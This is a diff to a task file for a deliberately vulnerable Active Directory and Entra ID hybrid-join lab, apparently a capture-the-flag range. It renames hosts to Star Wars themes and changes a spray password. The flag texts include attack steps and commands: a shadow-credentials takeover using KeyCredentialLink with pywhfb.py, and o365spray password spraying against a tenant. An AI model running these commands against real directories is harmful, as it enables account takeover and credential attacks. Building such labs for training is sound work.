@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_cloud_entra/tasks/hybrid_join.yml — CLO-021..040
-# Target: dc01.corp.local
+# Target: coruscant.empire.local
 #
 # CLO-021  Hybrid join SCP (Service Connection Point) in AD
 # CLO-022  PRT (Primary Refresh Token) theft surface
@@ -90,11 +90,11 @@
         KeyCredentialLink write — LAT-016), they can authenticate as the victim.
 
         Attack:
-          1. Write malicious KeyCredentialLink to victim account (HelpDesk ACE on ws01$)
+          1. Write malicious KeyCredentialLink to victim account (HelpDesk ACE on tatooine$)
           2. Request PKINIT cert using the crafted key
           3. Authenticate as victim
 
-          python3 pywhfb.py --target ws01$ --dc-ip 10.10.0.10
+          python3 pywhfb.py --target tatooine$ --dc-ip 10.10.0.10
 
     - path: 'C:\Flags\FLAG-CLO-028-LegacyAuth.txt'
       content: |
@@ -105,7 +105,7 @@
 
         Tools: o365spray, Spray-AD, MSOLSpray
           python3 o365spray.py --validate --domain corplab.onmicrosoft.com
-          python3 o365spray.py --spray --userfile users.txt --password 'Password123!' \
+          python3 o365spray.py --spray --userfile users.txt --password 'SithLord123!' \
             --domain corplab.onmicrosoft.com --protocol activesync
 
     - path: 'C:\Flags\FLAG-CLO-029-EvilGinx.txt'
